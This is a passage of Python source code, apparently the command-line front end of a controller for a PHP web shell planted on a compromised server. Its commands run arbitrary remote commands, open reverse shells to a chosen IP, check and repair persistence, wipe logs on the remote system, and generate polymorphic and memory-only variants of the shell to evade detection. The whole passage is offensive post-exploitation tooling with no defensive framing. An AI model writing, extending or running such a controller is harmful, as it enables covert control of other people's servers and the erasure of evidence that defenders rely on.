            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        if arg == "check":
            self.controller.check_persistence()
        elif arg == "repair":
            self.controller.repair_persistence()
        else:
            print(f"{Fore.YELLOW}Usage: persist check|repair")
    
    def do_revshell(self, arg):
        """Create a reverse shell: revshell <ip> [port]"""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        args = arg.split()
        if not args:
            print(f"{Fore.RED}Error: IP address required")
            return
        
        ip = args[0]
        port = int(args[1]) if len(args) > 1 else 4444
        
        self.controller.create_reverse_shell(ip, port)
    
    def do_clean(self, arg):
        """Clean logs on the remote system."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.clean_logs()
    
    def do_polymorphic(self, arg):
        """Create a polymorphic variant of the shell."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.create_polymorphic_shell()
    
    def do_memory(self, arg):
        """Activate memory-only mode for the shell."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.memory_only_mode()
    
    def do_exec(self, arg):
        """Execute a single command on the remote system."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        if not arg:
            print(f"{Fore.RED}Error: Command required")
            return
        
        response = self.controller.execute_command(arg)
        if response:
            print(response)
        else:
            print(f"{Fore.RED}No response or command failed.")
    
    def do_save(self, arg):
        """Save the current configuration to a file: save [filename]"""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        filename = arg or 'shell_config.ini'
        self.controller.save_config(filename)
    
    def do_load(self, arg):
        """Load configuration from a file: load [filename]"""
        filename = arg or 'shell_config.ini'
        
        if not os.path.exists(filename):
            print(f"{Fore.RED}Error: File not found: {filename}")
            return
        
        if not self.controller:
            # Create a dummy controller to load the config
            self.controller = ShellController("http://example.com")
        
        if self.controller.load_config(filename):
            if self.controller.test_connection():
                self.prompt = f"{Fore.CYAN}shell:{self.controller.shell_info.get('hostname', 'unknown')}> {Style.RESET_ALL}"
            else:
                print(f"{Fore.RED}Warning: Loaded configuration but connection test failed.")
    
    def do_exit(self, arg):
        """Exit the shell controller."""
        print(f"{Fore.YELLOW}Exiting...")
        return True
    
    def do_quit(self, arg):
        """Exit the shell controller."""
        return self.do_exit(arg)
    
    def default(self, line):
        """Handle unknown commands by trying to execute them on the shell."""
        if self.controller:
            response = self.controller.execute_command(line)
            if response:
                print(response)
            else:
                print(f"{Fore.RED}No response or command failed.")
        else:
            print(f"{Fore.RED}Unknown command: {line}")
            print(f"{Fore.RED}Type 'help' for a list of commands.")
    
    def emptyline(self):
        """Do nothing on empty line."""
        pass


def main():
    parser = argparse.ArgumentParser(description='PHP Web Shell Controller')
    parser.add_argument('-u', '--url', help='URL of the PHP shell')
    parser.add_argument('-k', '--key', help='Encryption key')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-a', '--agent', help='Custom User-Agent string')
    parser.add_argument('-c', '--config', help='Load configuration from file')
    
    args = parser.parse_args()
    
    cli = ShellControllerCLI()
    
    if args.config:
        cli.do_load(args.config)
    elif args.url:
        cli.do_connect(f"{args.url} {args.key or ''}")
    
    try:
        cli.cmdloop()
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")


if __name__ == "__main__":
    main()

